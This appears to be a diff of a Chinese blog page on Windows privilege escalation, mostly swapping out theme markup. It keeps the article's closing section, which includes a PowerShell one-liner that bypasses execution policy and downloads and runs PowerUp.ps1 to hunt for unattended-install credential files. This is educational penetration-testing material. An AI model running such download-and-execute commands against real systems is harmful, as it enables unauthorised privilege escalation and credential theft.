-<p><img src="image-20230923153945706.png" alt="image-20230923153945706"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230923153945706.png" alt="image-20230923153945706"></p>
 <p><strong>2. PowerUp中利用的模块</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ip/powerup.ps1');Get-UnattendedInstallFile"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="image-20230923154053979.png" alt="image-20230923154053979"></p>
+<pre><code class="hljs plaintext">powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ip/powerup.ps1');Get-UnattendedInstallFile"</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230923154053979.png" alt="image-20230923154053979"></p>
 <h2 id="0x04-后言">0x04 后言</h2>
 <p>本节中，我们主要介绍了Windows系统内核溢出漏洞提权和windows系统错误配置漏洞提权的可信任服务路径漏洞提权、系统服务错误权限配置漏洞提权、自动安装配置文件提权。其中最常用的可能就是Windows系统内核溢出漏洞提权了，windows系统错误配置漏洞不仅可以用来提权，在获取高权限后还可以用来设置一个高权限后门，以备后用。</p>
 <p>不过感觉我只是抄了一遍而已，因此我还是搞点靶场在实战中学习吧，毕竟靶场中肯定次次得提权。</p>
 <p>想了想日后的提权文章，还是针对某种类型单独写出来吧，感觉效果会好一点。</p>
 
-                
-            </div>
-            <hr/>
-
-            
-
-    <div class="reprint" id="reprint-statement">
-        
-            <div class="reprint__author">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-user">
-                        文章作者:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">hybcx</a>
-                </span>
-            </div>
-            <div class="reprint__type">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-link">
-                        文章链接:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    <a href="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/">http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/</a>
-                </span>
-            </div>
-            <div class="reprint__notice">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-copyright">
-                        版权声明:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    本博客所有文章除特別声明外，均采用
-                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
-                    许可协议。转载请注明来源
-                    <a href="/about" target="_blank">hybcx</a>
-                    !
-                </span>
-            </div>
-        
-    </div>
-
-    <script async defer>
-      document.addEventListener("copy", function (e) {
-        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
-        M.toast({html: toastHTML})
-      });
-
-      function navToReprintStatement() {
-        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
-      }
-    </script>
-
-
-
-            <div class="tag_share" style="display: block;">
-                <div class="post-meta__tag-list" style="display: inline-block;">
-                    
-                        <div class="article-tag">
-                            
-                                <a href="/tags/Windows-%E6%8F%90%E6%9D%83/">
-                                    <span class="chip bg-color">Windows 提权</span>
-                                </a>
-                            
-                        </div>
-                    
-                </div>
-                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
-                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
-<div id="article-share">
-
-    
-    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
-    <script src="/libs/share/js/social-share.min.js"></script>
-    
-
-    
-
+<div class="article-footer slide-up fs14">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
 </div>
-
-                </div>
-            </div>
-            
-                <div id="reward">
-    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
-
-    <!-- Modal Structure -->
-    <div id="rewardModal" class="modal">
-        <div class="modal-content">
-            <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">随缘，看各位佬的心情</h4>
-            <div class="reward-content">
-                <div class="reward-tabs">
-                    <ul class="tabs row">
-                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
-                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
-                    </ul>
-                    <div id="alipay">
-                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
-                    </div>
-                    <div id="wechat">
-                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-</div>
-
-<script>
-    $(function () {
-        $('.tabs').tabs();
-    });
-</script>
-
-            
-        </div>
-    </div>
-
-    
-
-    
-
-    
-
-    
-
-    
-        <style>
-    .valine-card {
-        margin: 1.5rem auto;
-    }
-
-    .valine-card .card-content {
-        padding: 20px 20px 5px 20px;
-    }
-
-    #vcomments textarea {
-        box-sizing: border-box;
-        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
-    }
-
-    #vcomments p {
-        margin: 2px 2px 10px;
-        font-size: 1.05rem;
-        line-height: 1.78rem;
-    }
-
-    #vcomments blockquote p {
-        text-indent: 0.2rem;
-    }
-
-    #vcomments a {
-        padding: 0 2px;
-        color: #4cbf30;
-        font-weight: 500;
-        text-decoration: none;
-    }
-
-    #vcomments img {
-        max-width: 100%;
-        height: auto;
-        cursor: pointer;
-    }
-
-    #vcomments ol li {
-        list-style-type: decimal;
-    }
-
-    #vcomments ol,
-    ul {
-        display: block;
-        padding-left: 2em;
-        word-spacing: 0.05rem;
-    }
-
-    #vcomments ul li,
-    ol li {
-        display: list-item;
-        line-height: 1.8rem;
-        font-size: 1rem;
-    }
-
-    #vcomments ul li {
-        list-style-type: disc;
-    }
-
-    #vcomments ul ul li {
-        list-style-type: circle;
-    }
-
-    #vcomments table, th, td {
-        padding: 12px 13px;
-        border: 1px solid #dfe2e5;
-    }
-
-    #vcomments table, th, td {
-        border: 0;
-    }
-
-    table tr:nth-child(2n), thead {
-        background-color: #fafafa;
-    }
-
-    #vcomments table th {
-        background-color: #f2f2f2;
-        min-width: 80px;
-    }
-
-    #vcomments table td {
-        min-width: 80px;
-    }
-
-    #vcomments h1 {
-        font-size: 1.85rem;
-        font-weight: bold;
-        line-height: 2.2rem;
-    }
-
-    #vcomments h2 {
-        font-size: 1.65rem;
-        font-weight: bold;
-        line-height: 1.9rem;
-    }
-
-    #vcomments h3 {
-        font-size: 1.45rem;
-        font-weight: bold;
-        line-height: 1.7rem;
-    }
-
-    #vcomments h4 {
-        font-size: 1.25rem;
-        font-weight: bold;
-        line-height: 1.5rem;
-    }
-
-    #vcomments h5 {
-        font-size: 1.1rem;
-        font-weight: bold;
-        line-height: 1.4rem;
-    }
-
-    #vcomments h6 {
-        font-size: 1rem;
-        line-height: 1.3rem;
-    }
-
-    #vcomments p {
-        font-size: 1rem;
-        line-height: 1.5rem;
-    }
-
-    #vcomments hr {
-        margin: 12px 0;
-        border: 0;
-        border-top: 1px solid #ccc;
-    }
-
-    #vcomments blockquote {
-        margin: 15px 0;
-        border-left: 5px solid #42b983;
-        padding: 1rem 0.8rem 0.3rem 0.8rem;
-        color: #666;
-        background-color: rgba(66, 185, 131, .1);
-    }
-
-    #vcomments pre {
-        font-family: monospace, monospace;
-        padding: 1.2em;
-        margin: .5em 0;
-        background: #272822;
-        overflow: auto;
-        border-radius: 0.3em;
-        tab-size: 4;
-    }
-
-    #vcomments code {
-        font-family: monospace, monospace;
-        padding: 1px 3px;
-        font-size: 0.92rem;
-        color: #e96900;
-        background-color: #f8f8f8;
-        border-radius: 2px;
-    }
-
-    #vcomments pre code {
-        font-family: monospace, monospace;
-        padding: 0;
-        color: #e8eaf6;
-        background-color: #272822;
-    }
-
-    #vcomments pre[class*="language-"] {
-        padding: 1.2em;
-        margin: .5em 0;
-    }
-
-    #vcomments code[class*="language-"],
-    pre[class*="language-"] {
-        color: #e8eaf6;
-    }
-
-    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
-        position: inherit;
-        margin-left: -1.3rem;
-        margin-right: 0.4rem;
-        margin-top: -1px;
-        vertical-align: middle;
-        left: unset;
-        visibility: visible;
-    }
-
-    #vcomments b,
-    strong {
-        font-weight: bold;
-    }
-
-    #vcomments dfn {
-        font-style: italic;
-    }
-
-    #vcomments small {
-        font-size: 85%;
-    }
-
-    #vcomments cite {
-        font-style: normal;
-    }
-
-    #vcomments mark {
-        background-color: #fcf8e3;
-        padding: .2em;
-    }
-
-    #vcomments table, th, td {
-        padding: 12px 13px;
-        border: 1px solid #dfe2e5;
-    }
-
-    table tr:nth-child(2n), thead {
-        background-color: #fafafa;
-    }
-
-    #vcomments table th {
-        background-color: #f2f2f2;
-        min-width: 80px;
-    }
-
-    #vcomments table td {
-        min-width: 80px;
-    }
-
-    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
-        position: inherit;
-        margin-left: -1.3rem;
-        margin-right: 0.4rem;
-        margin-top: -1px;
-        vertical-align: middle;
-        left: unset;
-        visibility: visible;
-    }
-</style>
-
-<div class="card valine-card" data-aos="fade-up">
-    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
-        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
-        <span>评论</span>
-    </div>
-    <div id="vcomments" class="card-content" style="display: grid">
-    </div>
-</div>
-
-<script src="/libs/valine/av-min.js"></script>
-<script src="/libs/valine/Valine.min.js"></script>
-<script>
-    new Valine({
-        el: '#vcomments',
-        appId: 'u0n6SeKEfoilg30pN4VxouXR-MdYXbMMI',
-        appKey: '36SdcVNDUm7oJBLF0OpXO4ut',
-        serverURLs: 'https://u0n6seke.api.lncldglobal.com',
-        notify: 'false' === 'true',
-        verify: 'false' === 'true',
-        visitor: 'false' === 'true',
-        avatar: 'mm',
-        pageSize: '10',
-        lang: 'zh-cn',
-        placeholder: 'just go go'
-    });
-</script>
-
-<!--酷Q推送-->
-
-
-    
-
-    
-
-    
-
-    
-
-    
-
-<article id="prenext-posts" class="prev-next articles">
-    <div class="row article-row">
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
-            <div class="card">
-                <a href="/2023/09/20/gitlab-ren-yi-wen-jian-du-qu-lou-dong-cve-2016-9086/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="Gitlab 任意文件读取漏洞（CVE-2016-9086）">
-                        
-                        <span class="card-title">Gitlab 任意文件读取漏洞（CVE-2016-9086）</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-09-20
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/CVE%E6%BC%8F%E6%B4%9E/" class="post-category">
-                                    CVE漏洞
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/CVE/">
-                        <span class="chip bg-color">CVE</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2023/09/19/php-cgi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2012-1823/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="PHP-CGI远程代码执行漏洞（CVE-2012-1823）">
-                        
-                        <span class="card-title">PHP-CGI远程代码执行漏洞（CVE-2012-1823）</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-09-19
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/CVE%E6%BC%8F%E6%B4%9E/" class="post-category">
-                                    CVE漏洞
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/CVE/">
-                        <span class="chip bg-color">CVE</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
+    </section>
     </div>
 </article>
+<div class="related-wrap slide-up" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2023/09/20/gitlab-ren-yi-wen-jian-du-qu-lou-dong-cve-2016-9086/">Gitlab 任意文件读取漏洞（CVE-2016-9086）</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2023/09/19/php-cgi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2012-1823/">PHP-CGI远程代码执行漏洞（CVE-2012-1823）</a></div></section></div>
 
+<div class="related-wrap slide-up" id="related-posts">
+    <section class='header'>
+      <div class='title cap theme'>您可能感兴趣的文章</div>
+    </section>
+    <section class='body'>
+    <div class="related-posts"><a class="item" href="\2023\09\27\linux-ti-quan-xue-xi-yi\" title="Linux提权学习之rbash逃逸"><span class="title">Linux提权学习之rbash逃逸</span></a></div></section></div>
+
+
+  <div class="related-wrap md-text slide-up" id="comments">
+    <section class='header cmt-title cap theme'>
+      <p>感谢大佬们的不吝赐教！</p>
+
+    </section>
+    <section class='body cmt-body twikoo'>
+      
+
+<div id="twikoo_container"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+    </section>
+  </div>
+
+
+
+<footer class="page-footer slide-up footnote"><hr><div class="text"><p><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<p>本站由 <a href="/">hybcx</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1">Stellar 1.28.1</a> 主题创建。<br>
+本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper slide-up toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">0x01 基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#11-%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4"><span class="toc-text">1.1 提权基础命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-windows-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86"><span class="toc-text">1.2 Windows 权限划分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13-%E5%B8%B8%E8%A7%81-webshell-%E6%89%80%E5%A4%84%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-text">1.3 常见 webshell 所处的权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E5%88%86%E7%B1%BB"><span class="toc-text">1.4 权限提升分类</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-text">0x02 系统内核溢出漏洞提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#21-%E6%89%8B%E5%8A%A8%E6%9F%A5%E6%89%BE%E7%B3%BB%E7%BB%9F%E6%BD%9C%E5%9C%A8%E6%BC%8F%E6%B4%9E"><span class="toc-text">2.1 手动查找系统潜在漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#22-%E8%87%AA%E5%8A%A8%E6%9F%A5%E6%89%BE%E7%B3%BB%E7%BB%9F%E6%BD%9C%E5%9C%A8%E6%BC%8F%E6%B4%9E"><span class="toc-text">2.2 自动查找系统潜在漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80windows-exploit-suggester"><span class="toc-text">方法一：Windows Exploit Suggester</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8Clocal_exploit_suggester-%E6%A8%A1%E5%9D%97"><span class="toc-text">方法二：local_exploit_suggester 模块</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B0%8Ftip%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E6%99%AE%E9%80%9Asession"><span class="toc-text">小tip：后渗透之获取普通session</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89enum_patches-%E6%A8%A1%E5%9D%97"><span class="toc-text">方法三：enum_patches 模块</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#23-%E9%80%89%E6%8B%A9%E6%BC%8F%E6%B4%9E%E5%B9%B6%E5%88%A9%E7%94%A8"><span class="toc-text">2.3 选择漏洞并利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E7%B3%BB%E7%BB%9F%E9%94%99%E8%AF%AF%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-text">0x03 系统错误配置漏洞提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#trusted-service-paths%E6%BC%8F%E6%B4%9E%E5%8F%AF%E4%BF%A1%E4%BB%BB%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84%E6%BC%8F%E6%B4%9E"><span class="toc-text">Trusted Service Paths漏洞（可信任服务路径漏洞）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E9%94%99%E8%AF%AF%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E"><span class="toc-text">系统服务错误权限配置漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8powerupps1%E8%84%9A%E6%9C%AC"><span class="toc-text">1. 利用PowerUp.ps1脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-metasploit%E4%B8%AD%E7%9A%84service_permissions%E6%A8%A1%E5%9D%97"><span class="toc-text">2. Metasploit中的service_permissions模块</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E4%B8%8Eaccesschk%E4%BD%BF%E7%94%A8"><span class="toc-text">0x04 计划任务与AccessChk使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#accesschk%E4%BD%BF%E7%94%A8"><span class="toc-text">AccessChk使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-text">自动安装配置文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E5%90%8E%E8%A8%80"><span class="toc-text">0x04 后言</span></a></li></ol></div><div class="widget-footer">
+
+<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M10.46 1.25h3.08c1.603 0 2.86 0 3.864.095c1.023.098 1.861.3 2.6.752a5.75 5.75 0 0 1 1.899 1.899c.452.738.654 1.577.752 2.6c.095 1.004.095 2.261.095 3.865v1.067c0 1.141 0 2.036-.05 2.759c-.05.735-.153 1.347-.388 1.913a5.75 5.75 0 0 1-3.112 3.112c-.805.334-1.721.408-2.977.43a10.81 10.81 0 0 0-.929.036c-.198.022-.275.054-.32.08c-.047.028-.112.078-.224.232c-.121.166-.258.396-.476.764l-.542.916c-.773 1.307-2.69 1.307-3.464 0l-.542-.916a10.605 10.605 0 0 0-.476-.764c-.112-.154-.177-.204-.224-.232c-.045-.026-.122-.058-.32-.08c-.212-.023-.49-.03-.93-.037c-1.255-.021-2.171-.095-2.976-.429A5.75 5.75 0 0 1 1.688 16.2c-.235-.566-.338-1.178-.389-1.913c-.049-.723-.049-1.618-.049-2.76v-1.066c0-1.604 0-2.86.095-3.865c.098-1.023.3-1.862.752-2.6a5.75 5.75 0 0 1 1.899-1.899c.738-.452 1.577-.654 2.6-.752C7.6 1.25 8.857 1.25 10.461 1.25M6.739 2.839c-.914.087-1.495.253-1.959.537A4.25 4.25 0 0 0 3.376 4.78c-.284.464-.45 1.045-.537 1.96c-.088.924-.089 2.11-.089 3.761v1c0 1.175 0 2.019.046 2.685c.045.659.131 1.089.278 1.441a4.25 4.25 0 0 0 2.3 2.3c.515.214 1.173.294 2.429.316h.031c.398.007.747.013 1.037.045c.311.035.616.104.909.274c.29.17.5.395.682.645c.169.232.342.525.538.856l.559.944a.52.52 0 0 0 .882 0l.559-.944c.196-.331.37-.624.538-.856c.182-.25.392-.476.682-.645c.293-.17.598-.24.909-.274c.29-.032.639-.038 1.037-.045h.032c1.255-.022 1.913-.102 2.428-.316a4.25 4.25 0 0 0 2.3-2.3c.147-.352.233-.782.278-1.441c.046-.666.046-1.51.046-2.685v-1c0-1.651 0-2.837-.089-3.762c-.087-.914-.253-1.495-.537-1.959a4.25 4.25 0 0 0-1.403-1.403c-.464-.284-1.045-.45-1.96-.537c-.924-.088-2.11-.089-3.761-.089h-3c-1.651 0-2.837 0-3.762.089" clip-rule="evenodd"/><path fill="currentColor" d="M9 11a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><span>参与讨论</span></a></div></widget>
+</div></aside><div class='float-panel blur'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
 </div>
+</div><div class="scripts">
+<script type="text/javascript">
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+  };
 
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+  };
+  const deps = {
+    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
+    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
+  }
+  
 
+</script>
 
-<!-- 代码块功能依赖 -->
-<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+<script type="text/javascript">
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
 
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
 
-  <!-- 是否加载使用自带的 prismjs. -->
-  <script type="text/javascript" src="/libs/prism/prism.js"></script>
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
